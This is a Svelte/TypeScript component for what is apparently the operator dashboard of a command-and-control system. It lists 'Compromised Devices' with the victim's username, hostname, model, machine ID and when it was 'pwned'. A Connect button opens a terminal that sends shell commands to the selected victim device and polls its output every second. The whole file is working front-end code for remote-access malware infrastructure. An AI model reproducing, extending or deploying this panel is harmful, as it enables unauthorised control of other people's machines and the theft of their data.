<script lang="ts">
    import { onMount } from "svelte";
    import { enhance } from "$app/forms";
    import SplitPane from "$lib/components/SplitPane.svelte";

    function clearResult() {
        error = "";
    }
    let error = $state("");

    let stdout: HTMLElement;
    let inputEl: HTMLElement;

    let cmd = $state("");
    let sid = $state("");
    let idle_s = $state("");
    let pwns = $state<
        {
            id: number;
            sid: string;
            username: string;
            hostname: string;
            model: string;
            machine_id: string;
            pwned_at: Date;
        }[]
    >([]);

    function Interact(device: {
        id: number;
        sid: string;
        username: string;
        hostname: string;
        model: string;
        machine_id: string;
        pwned_at: Date;
    }) {
        sid = device.sid;
        idle_s = `${device.username}@${device.hostname} >$`;
        inputEl.focus();
    }

    let stdinForm: HTMLElement;
    let stdoutElem: HTMLElement;
    function calcOutputHeight() {
        if (!stdinForm || !stdoutElem) return;

        const outputTop = stdoutElem.getBoundingClientRect().top;
        const inputTop = stdinForm.getBoundingClientRect().top;

        const height = inputTop - outputTop;

        stdoutElem.style.height = `${height}px`;
    }

    onMount(() => {
        async function updateList() {
            const res = await fetch("/api/devices", { credentials: "include" });
            const json = await res.json();
            if (json.error) {
                error = json.error;
                setTimeout(clearResult, 5000);
                return;
            }
            pwns = json.devices;
        }

        async function updateOutput() {
            const res = await fetch("/api/session", { credentials: "include" });
            const json = await res.json();
            if (json.error) {
                error = json.error;
                setTimeout(clearResult, 5000);
                return;
            }
            stdout.textContent = json.output;
        }

        updateList();
        updateOutput();
        const t1 = setInterval(updateList, 1000);
        const t2 = setInterval(updateOutput, 1000);
        setInterval(calcOutputHeight, 100);

        document.body.classList.add("no-scroll");
        return () => {
            clearInterval(t1); // clean up on destroy
            clearInterval(t2); // clean up on destroy
            document.body.classList.remove("no-scroll");
        };
    });
</script>

<SplitPane>
    {#snippet topContent()}
        <div style="padding: 1rem;">
            <h2>Compromised Devices</h2>
            <!-- Popup / alert area -->
            {#if error}
                <div class="alert alert-danger">{error}</div>
            {/if}
            <hr />

            <ul>
                {#each pwns as d}
                    <li>
                        <strong>{d.username}@{d.hostname}</strong>
                        <small>({d.id})</small><br />

                        Device: {d.model}<br />

                        <small>
                            Machine ID:
                            <code>{d.machine_id}</code>
                        </small><br />
                        <button
                            class="btn btn-primary"
                            onclick={() => {
                                Interact(d);
                            }}>Connect</button
                        >
                    </li>
                {/each}
            </ul>
        </div>
    {/snippet}

    {#snippet bottomContent()}
        <div bind:this={stdoutElem} class="terminal">
            <div class="stdout-area">
                <pre id="term-out" class="stdout" bind:this={stdout}></pre>
            </div>
            <form
                bind:this={stdinForm}
                class="stdin-area"
                method="POST"
                action="?/send"
                use:enhance={() => {
                    return async ({ update }) => {
                        await update();
                        cmd = "";
                        inputEl.focus();
                    };
                }}
            >
                <input
                    id="cmd"
                    name="cmd"
                    class="stdin"
                    type="text"
                    bind:this={inputEl}
                    bind:value={cmd}
                    placeholder={idle_s}
                    autocomplete="off"
                    spellcheck="false"
                />
                <input type="hidden" id="sid" name="sid" bind:value={sid} />
            </form>
        </div>
    {/snippet}
</SplitPane>
